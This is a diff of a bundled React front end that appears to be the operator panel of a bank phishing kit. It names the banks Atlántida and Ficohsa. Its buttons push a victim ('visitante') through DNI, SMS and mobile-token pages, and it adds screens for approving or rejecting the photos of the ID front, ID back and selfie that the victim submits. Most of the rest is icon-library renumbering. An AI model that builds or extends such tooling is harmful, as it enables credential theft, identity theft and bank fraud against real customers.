             ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-md border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-400", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
           ] })
+        ] }),
+        user.fotoSelfie && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Selfie" }),
+          typeof user.fotoSelfie === "string" && user.fotoSelfie.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              onClick: () => onSelectPhoto?.({ src: user.fotoSelfie, title: "Selfie" }),
+              className: "relative group/thumb rounded-md overflow-hidden border border-emerald-500/40 hover:border-emerald-400 transition-all aspect-[16/10] bg-black/60 focus:outline-none cursor-pointer",
+              title: "Ver selfie en pantalla completa",
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(
+                  "img",
+                  {
+                    src: user.fotoSelfie,
+                    alt: "Selfie Facial",
+                    className: "w-full h-full object-cover group-hover/thumb:scale-105 transition-transform duration-200"
+                  }
+                ),
+                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/40 opacity-0 group-hover/thumb:opacity-100 flex items-center justify-center transition-opacity", children: /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-white font-medium bg-black/70 px-1.5 py-0.5 rounded", children: "Ver" }) })
+              ]
+            }
+          ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-md border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-400", children: "Aprobada" })
         ] })
       ] }),
       /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "border-t border-gray-700/50 mt-2 pt-2" }),
@@ -22764,8 +22866,8 @@ const createReactComponent = (type, iconName, iconNamePascal, iconNode) => {
  */
 
 
-const __iconNode$m = [["path", { "d": "M13 3l0 7l6 0l-8 11l0 -7l-6 0l8 -11", "key": "svg-0" }]];
-const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$m);
+const __iconNode$n = [["path", { "d": "M13 3l0 7l6 0l-8 11l0 -7l-6 0l8 -11", "key": "svg-0" }]];
+const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$n);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22775,8 +22877,8 @@ const IconBolt = createReactComponent("outline", "bolt", "Bolt", __iconNode$m);
  */
 
 
-const __iconNode$l = [["path", { "d": "M3 21l18 0", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M5 6l7 -3l7 3", "key": "svg-2" }], ["path", { "d": "M4 10l0 11", "key": "svg-3" }], ["path", { "d": "M20 10l0 11", "key": "svg-4" }], ["path", { "d": "M8 14l0 3", "key": "svg-5" }], ["path", { "d": "M12 14l0 3", "key": "svg-6" }], ["path", { "d": "M16 14l0 3", "key": "svg-7" }]];
-const IconBuildingBank = createReactComponent("outline", "building-bank", "BuildingBank", __iconNode$l);
+const __iconNode$m = [["path", { "d": "M3 21l18 0", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M5 6l7 -3l7 3", "key": "svg-2" }], ["path", { "d": "M4 10l0 11", "key": "svg-3" }], ["path", { "d": "M20 10l0 11", "key": "svg-4" }], ["path", { "d": "M8 14l0 3", "key": "svg-5" }], ["path", { "d": "M12 14l0 3", "key": "svg-6" }], ["path", { "d": "M16 14l0 3", "key": "svg-7" }]];
+const IconBuildingBank = createReactComponent("outline", "building-bank", "BuildingBank", __iconNode$m);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22786,8 +22888,8 @@ const IconBuildingBank = createReactComponent("outline", "building-bank", "Build
  */
 
 
-const __iconNode$k = [["path", { "d": "M5 7h1a2 2 0 0 0 2 -2a1 1 0 0 1 1 -1h6a1 1 0 0 1 1 1a2 2 0 0 0 2 2h1a2 2 0 0 1 2 2v9a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-9a2 2 0 0 1 2 -2", "key": "svg-0" }], ["path", { "d": "M9 13a3 3 0 1 0 6 0a3 3 0 0 0 -6 0", "key": "svg-1" }]];
-const IconCamera = createReactComponent("outline", "camera", "Camera", __iconNode$k);
+const __iconNode$l = [["path", { "d": "M5 7h1a2 2 0 0 0 2 -2a1 1 0 0 1 1 -1h6a1 1 0 0 1 1 1a2 2 0 0 0 2 2h1a2 2 0 0 1 2 2v9a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-9a2 2 0 0 1 2 -2", "key": "svg-0" }], ["path", { "d": "M9 13a3 3 0 1 0 6 0a3 3 0 0 0 -6 0", "key": "svg-1" }]];
+const IconCamera = createReactComponent("outline", "camera", "Camera", __iconNode$l);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22797,8 +22899,8 @@ const IconCamera = createReactComponent("outline", "camera", "Camera", __iconNod
  */
 
 
-const __iconNode$j = [["path", { "d": "M5 12l5 5l10 -10", "key": "svg-0" }]];
-const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$j);
+const __iconNode$k = [["path", { "d": "M5 12l5 5l10 -10", "key": "svg-0" }]];
+const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$k);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22808,8 +22910,8 @@ const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$j
  */
 
 
-const __iconNode$i = [["path", { "d": "M6 9l6 6l6 -6", "key": "svg-0" }]];
-const IconChevronDown = createReactComponent("outline", "chevron-down", "ChevronDown", __iconNode$i);
+const __iconNode$j = [["path", { "d": "M6 9l6 6l6 -6", "key": "svg-0" }]];
+const IconChevronDown = createReactComponent("outline", "chevron-down", "ChevronDown", __iconNode$j);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22819,8 +22921,8 @@ const IconChevronDown = createReactComponent("outline", "chevron-down", "Chevron
  */
 
 
-const __iconNode$h = [["path", { "d": "M6 15l6 -6l6 6", "key": "svg-0" }]];
-const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp", __iconNode$h);
+const __iconNode$i = [["path", { "d": "M6 15l6 -6l6 6", "key": "svg-0" }]];
+const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp", __iconNode$i);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22830,8 +22932,8 @@ const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp",
  */
 
 
-const __iconNode$g = [["path", { "d": "M3 12a9 9 0 1 0 18 0a9 9 0 1 0 -18 0", "key": "svg-0" }], ["path", { "d": "M12 12l3 2", "key": "svg-1" }], ["path", { "d": "M12 7v5", "key": "svg-2" }]];
-const IconClockHour4 = createReactComponent("outline", "clock-hour-4", "ClockHour4", __iconNode$g);
+const __iconNode$h = [["path", { "d": "M3 12a9 9 0 1 0 18 0a9 9 0 1 0 -18 0", "key": "svg-0" }], ["path", { "d": "M12 12l3 2", "key": "svg-1" }], ["path", { "d": "M12 7v5", "key": "svg-2" }]];
+const IconClockHour4 = createReactComponent("outline", "clock-hour-4", "ClockHour4", __iconNode$h);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22841,8 +22943,8 @@ const IconClockHour4 = createReactComponent("outline", "clock-hour-4", "ClockHou
  */
 
 
-const __iconNode$f = [["path", { "d": "M7 9.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667l0 -8.666", "key": "svg-0" }], ["path", { "d": "M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1", "key": "svg-1" }]];
-const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$f);
+const __iconNode$g = [["path", { "d": "M7 9.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667l0 -8.666", "key": "svg-0" }], ["path", { "d": "M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1", "key": "svg-1" }]];
+const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$g);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22852,8 +22954,8 @@ const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$f);
  */
 
 
-const __iconNode$e = [["path", { "d": "M3 8a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3l0 -8", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M7 15l.01 0", "key": "svg-2" }], ["path", { "d": "M11 15l2 0", "key": "svg-3" }]];
-const IconCreditCard = createReactComponent("outline", "credit-card", "CreditCard", __iconNode$e);
+const __iconNode$f = [["path", { "d": "M3 8a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3l0 -8", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M7 15l.01 0", "key": "svg-2" }], ["path", { "d": "M11 15l2 0", "key": "svg-3" }]];
+const IconCreditCard = createReactComponent("outline", "credit-card", "CreditCard", __iconNode$f);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22863,8 +22965,8 @@ const IconCreditCard = createReactComponent("outline", "credit-card", "CreditCar
  */
 
 
-const __iconNode$d = [["path", { "d": "M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2v-2", "key": "svg-0" }], ["path", { "d": "M7 11l5 5l5 -5", "key": "svg-1" }], ["path", { "d": "M12 4l0 12", "key": "svg-2" }]];
-const IconDownload = createReactComponent("outline", "download", "Download", __iconNode$d);
+const __iconNode$e = [["path", { "d": "M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2v-2", "key": "svg-0" }], ["path", { "d": "M7 11l5 5l5 -5", "key": "svg-1" }], ["path", { "d": "M12 4l0 12", "key": "svg-2" }]];
+const IconDownload = createReactComponent("outline", "download", "Download", __iconNode$e);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22874,8 +22976,8 @@ const IconDownload = createReactComponent("outline", "download", "Download", __i
  */
 
 
-const __iconNode$c = [["path", { "d": "M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0", "key": "svg-0" }], ["path", { "d": "M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6", "key": "svg-1" }]];
-const IconEye = createReactComponent("outline", "eye", "Eye", __iconNode$c);
+const __iconNode$d = [["path", { "d": "M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0", "key": "svg-0" }], ["path", { "d": "M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6", "key": "svg-1" }]];
+const IconEye = createReactComponent("outline", "eye", "Eye", __iconNode$d);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22885,8 +22987,19 @@ const IconEye = createReactComponent("outline", "eye", "Eye", __iconNode$c);
  */
 
 
-const __iconNode$b = [["path", { "d": "M4 14v-3a8 8 0 1 1 16 0v3", "key": "svg-0" }], ["path", { "d": "M18 19c0 1.657 -2.686 3 -6 3", "key": "svg-1" }], ["path", { "d": "M4 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-2" }], ["path", { "d": "M15 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-3" }]];
-const IconHeadset = createReactComponent("outline", "headset", "Headset", __iconNode$b);
+const __iconNode$c = [["path", { "d": "M4 14v-3a8 8 0 1 1 16 0v3", "key": "svg-0" }], ["path", { "d": "M18 19c0 1.657 -2.686 3 -6 3", "key": "svg-1" }], ["path", { "d": "M4 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-2" }], ["path", { "d": "M15 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-3" }]];
+const IconHeadset = createReactComponent("outline", "headset", "Headset", __iconNode$c);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$b = [["path", { "d": "M3 7a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v10a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3l0 -10", "key": "svg-0" }], ["path", { "d": "M7 10a2 2 0 1 0 4 0a2 2 0 1 0 -4 0", "key": "svg-1" }], ["path", { "d": "M15 8l2 0", "key": "svg-2" }], ["path", { "d": "M15 12l2 0", "key": "svg-3" }], ["path", { "d": "M7 16l10 0", "key": "svg-4" }]];
+const IconId = createReactComponent("outline", "id", "Id", __iconNode$b);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -23025,6 +23138,7 @@ const ActionsPanel = ({
   onFinalizar,
   onError,
   onFoto,
+  onFotoSelfie,
   selectedBank = "atlantida"
 }) => {
   const [isEnding, setIsEnding] = reactExports.useState(false);
@@ -23081,10 +23195,10 @@ const ActionsPanel = ({
   const isFicohsa = selectedBank === "ficohsa";
   const themeActiveBtnClass = "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#0058CB] shadow hover:bg-[#0047a8] active:bg-[#003a7c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#0058CB]/60";
   const tokenBtnClass = themeActiveBtnClass;
-  const fotoBtnClass = "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#004bb0] shadow hover:bg-[#0045a3] active:bg-[#003680] active:translate-y-[1.5px] focus:ring-2 focus:ring-cyan-400/60";
+  const fotoBtnClass = isFicohsa ? "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#004bb0] shadow hover:bg-[#0045a3] active:bg-[#003680] active:translate-y-[1.5px] focus:ring-2 focus:ring-cyan-400/60" : "bg-purple-600 text-white font-bold backdrop-blur-md border border-purple-700 shadow hover:bg-purple-500 active:bg-purple-700 active:translate-y-[1.5px] focus:ring-2 focus:ring-purple-400/60";
   const btn1Label = "DNI/RTN";
-  const btn2Label = isFicohsa ? "Token Móvil" : "Desbloquear";
-  const btn3Label = isFicohsa ? "Token SMS" : "Registrar";
+  const btn2Label = isFicohsa ? "Token Móvil" : "SMS Desbloquear";
+  const btn3Label = isFicohsa ? "Token SMS" : "SMS Registrar";
   const btn4Label = isFicohsa ? "Préstamo" : "Finalizar";
   return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "\r\n      bg-neutral-950/90 backdrop-blur-xl \r\n      p-3.5 rounded-xl \r\n      border border-neutral-800/80 \r\n      shadow-2xl shadow-black/60 \r\n      cursor-move w-72 text-xs\r\n    ", children: [
     /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center py-2 mb-2", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-transparent", children: [
@@ -23160,10 +23274,10 @@ const ActionsPanel = ({
             onClick: () => onUpdatePage(8),
             disabled: !isPageEnabled(8),
             className: `
-                py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
+                py-2 px-2 rounded-lg font-medium whitespace-nowrap transition-all duration-300 ease-out
                 ${isPageEnabled(8) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
               `,
-            children: "Token Validar"
+            children: "T. Desbloquear"
           }
         ),
         /* @__PURE__ */ jsxRuntimeExports.jsx(
@@ -23172,10 +23286,10 @@ const ActionsPanel = ({
             onClick: () => onUpdatePage(9),
             disabled: !isPageEnabled(9),
             className: `
-                py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
+                py-2 px-2 rounded-lg font-medium whitespace-nowrap transition-all duration-300 ease-out
                 ${isPageEnabled(9) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
               `,
-            children: "Token Autorizar"
+            children: "T. Registrar"
           }
         )
       ] }),
@@ -23217,7 +23331,7 @@ const ActionsPanel = ({
         ),
         (currentPage !== 0 || successPressed) && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n              absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n              hidden group-hover:block \r\n              bg-gray-900/95 text-white text-[10px] \r\n              rounded-md px-2.5 py-1.5 \r\n              shadow-xl border border-gray-700/40 \r\n              backdrop-blur-sm whitespace-nowrap z-50\r\n            ", children: successPressed ? "Ya se confirmó éxito" : "Solo disponible en estado de carga" })
       ] }),
-      isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "col-span-2 relative group", children: [
+      isFicohsa ? /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "col-span-2 relative group", children: [
         /* @__PURE__ */ jsxRuntimeExports.jsxs(
           "button",
           {
@@ -23230,11 +23344,50 @@ const ActionsPanel = ({
               `,
             children: [
               /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
-              "Foto"
+              "Foto Tarjeta"
             ]
           }
         ),
         currentPage !== 0 && currentPage !== 7 && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n                absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n                hidden group-hover:block \r\n                bg-gray-900/95 text-white text-[10px] \r\n                rounded-md px-2.5 py-1.5 \r\n                shadow-xl border border-gray-700/40 \r\n                backdrop-blur-sm whitespace-nowrap z-50\r\n              ", children: "Solo disponible en estado de carga" })
+      ] }) : /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "col-span-1 relative group", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              onClick: () => onFoto ? onFoto() : onUpdatePage(7),
+              disabled: currentPage !== 0 && currentPage !== 7,
+              className: `
+                  w-full py-2 px-2.5 rounded-lg font-medium flex items-center justify-center gap-1.5 
+                  transition-all duration-300 ease-out text-xs
+                  ${currentPage === 7 ? `${fotoBtnClass} ring-2 ring-purple-400/60` : currentPage === 0 ? fotoBtnClass : "bg-gray-800/50 text-purple-400/70 cursor-not-allowed border border-purple-900/30 backdrop-blur-sm hover:bg-gray-800/60"}
+                `,
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                "Foto DNI"
+              ]
+            }
+          ),
+          currentPage !== 0 && currentPage !== 7 && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n                  absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n                  hidden group-hover:block \r\n                  bg-gray-900/95 text-white text-[10px] \r\n                  rounded-md px-2 py-1.5 \r\n                  shadow-xl border border-gray-700/40 \r\n                  backdrop-blur-sm whitespace-nowrap z-50\r\n                ", children: "Solo en carga" })
+        ] }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "col-span-1 relative group", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              onClick: () => onFotoSelfie ? onFotoSelfie() : onUpdatePage(10),
+              disabled: currentPage !== 0 && currentPage !== 10,
+              className: `
+                  w-full py-2 px-2.5 rounded-lg font-medium flex items-center justify-center gap-1.5 
+                  transition-all duration-300 ease-out text-xs
+                  ${currentPage === 10 ? `${fotoBtnClass} ring-2 ring-purple-400/60` : currentPage === 0 ? fotoBtnClass : "bg-gray-800/50 text-purple-400/70 cursor-not-allowed border border-purple-900/30 backdrop-blur-sm hover:bg-gray-800/60"}
+                `,
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                "Foto Selfie"
+              ]
+            }
+          ),
+          currentPage !== 0 && currentPage !== 10 && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n                  absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n                  hidden group-hover:block \r\n                  bg-gray-900/95 text-white text-[10px] \r\n                  rounded-md px-2 py-1.5 \r\n                  shadow-xl border border-gray-700/40 \r\n                  backdrop-blur-sm whitespace-nowrap z-50\r\n                ", children: "Solo en carga" })
+        ] })
       ] }),
       /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "col-span-2 h-3" }),
       /* @__PURE__ */ jsxRuntimeExports.jsxs(
@@ -56382,6 +56535,207 @@ function ErrorPage$1({
   ] });
 }
 
+const FotoPage$1 = ({
+  fotoTemporal,
+  fotoTemporalHD,
+  esperandoAprobacionFoto,
+  fotoRechazada,
+  fotoAprobada,
+  pasoFoto = "frente",
+  isPhotoActionLoading = false,
+  onAprobarFoto,
+  onRechazarFoto
+}) => {
+  const imagenMostrar = fotoTemporalHD || fotoTemporal;
+  const esReverso = pasoFoto === "reverso";
+  const esCompletado = pasoFoto === "completado" || fotoAprobada;
+  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center select-none bg-black/90 text-white rounded-2xl shadow-2xl border border-neutral-800 p-5 sm:p-6 backdrop-blur-md", children: [
+    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex items-center justify-between pb-3 mb-4 border-b border-neutral-800", children: [
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2.5", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "p-2 rounded-xl bg-red-600/20 text-[#E31B23] border border-red-500/30", children: /* @__PURE__ */ jsxRuntimeExports.jsx(IconId, { size: 20 }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("h2", { className: "text-base font-bold text-white tracking-wide leading-tight", children: esCompletado ? "Documento Verificado" : esReverso ? "Reverso del Documento (DNI)" : "Frente del Documento (DNI)" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("p", { className: "text-xs text-gray-300 mt-0.5", children: [
+            "Paso ",
+            esReverso ? "2 de 2" : "1 de 2",
+            " • ",
+            esReverso ? "Parte posterior" : "Parte delantera"
+          ] })
+        ] })
+      ] }),
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+        esperandoAprobacionFoto && imagenMostrar && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-amber-500/25 text-amber-300 border border-amber-400/40 text-xs font-semibold px-3 py-1 rounded-full animate-pulse shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2 h-2 rounded-full bg-amber-400" }),
+          "Por Validar"
+        ] }),
+        fotoRechazada && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-red-500/25 text-red-300 border border-red-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-red-400" }),
+          "Reintentando..."
+        ] }),
+        esCompletado && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-emerald-500/25 text-emerald-300 border border-emerald-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14, className: "text-emerald-400" }),
+          "Aprobada"
+        ] })
+      ] })
+    ] }),
+    imagenMostrar ? (
+      /* Vista de la fotografía enviada con proporción de documento */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center gap-4", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "relative w-full max-w-[440px] aspect-[1.58/1] rounded-2xl overflow-hidden bg-black shadow-2xl border-2 border-red-500/80", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(
+            "img",
+            {
+              src: imagenMostrar,
+              alt: esReverso ? "Reverso del Documento" : "Frente del Documento",
+              className: "w-full h-full object-cover"
+            }
+          ),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute top-3 left-3 bg-black/80 backdrop-blur-md text-white text-[10px] font-bold uppercase tracking-wider px-2.5 py-1 rounded-lg border border-white/20 shadow-md", children: esReverso ? "Lado Reverso" : "Lado Frontal" })
+        ] }),
+        esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-center gap-3 w-full max-w-[440px] pt-1", children: [
+          onRechazarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              disabled: isPhotoActionLoading,
+              onClick: onRechazarFoto,
+              className: "flex-1 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2 shadow-md active:scale-95",
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 17, className: isPhotoActionLoading ? "animate-spin" : "" }),
+                "Pedir reintento"
+              ]
+            }
+          ),
+          onAprobarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              disabled: isPhotoActionLoading,
+              onClick: onAprobarFoto,
+              className: "flex-1 py-3 px-5 rounded-xl font-bold text-xs sm:text-sm bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed text-white transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/50 active:scale-95",
+              children: [
+                isPhotoActionLoading ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 18, className: "animate-spin" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 18, strokeWidth: 2.5 }),
+                isPhotoActionLoading ? "Procesando..." : "Aprobar"
+              ]
+            }
+          )
+        ] })
+      ] })
+    ) : (
+      /* Vista de espera activa mientras el visitante captura */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full max-w-[440px] aspect-[1.58/1] rounded-2xl border-2 border-dashed border-red-500/40 flex items-center justify-center bg-black/50 backdrop-blur-sm relative overflow-hidden shadow-2xl", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 pointer-events-none", children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute w-full h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent shadow-[0_0_15px_#E31B23] animate-scan-laser-vertical" }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-center relative z-10 p-5", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-14 h-14 rounded-2xl bg-red-600/20 text-red-400 flex items-center justify-center mx-auto mb-2.5 shadow-lg border border-red-500/20", children: fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 30, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 30, className: "animate-pulse" }) }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-sm sm:text-base font-bold text-white mb-0.5", children: fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs text-red-300 font-medium", children: esReverso ? "Reverso del documento" : "Frente del documento" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "mt-3 inline-flex items-center gap-1.5 text-[11px] text-gray-300 bg-white/10 px-3 py-1 rounded-full border border-white/15", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsx(IconClockHour4, { size: 13, className: "text-red-400" }),
+            /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: "Los botones aparecerán cuando la envíe" })
+          ] })
+        ] })
+      ] })
+    )
+  ] });
+};
+
+const FotoSelfiePage = ({
+  fotoTemporal,
+  fotoTemporalHD,
+  esperandoAprobacionFoto,
+  fotoRechazada,
+  fotoAprobada,
+  isPhotoActionLoading = false,
+  onAprobarFoto,
+  onRechazarFoto
+}) => {
+  const imagenMostrar = fotoTemporalHD || fotoTemporal;
+  const esCompletado = fotoAprobada;
+  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center select-none bg-black/90 text-white rounded-2xl shadow-2xl border border-neutral-800 p-5 sm:p-6 backdrop-blur-md", children: [
+    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex items-center justify-between pb-3 mb-4 border-b border-neutral-800", children: [
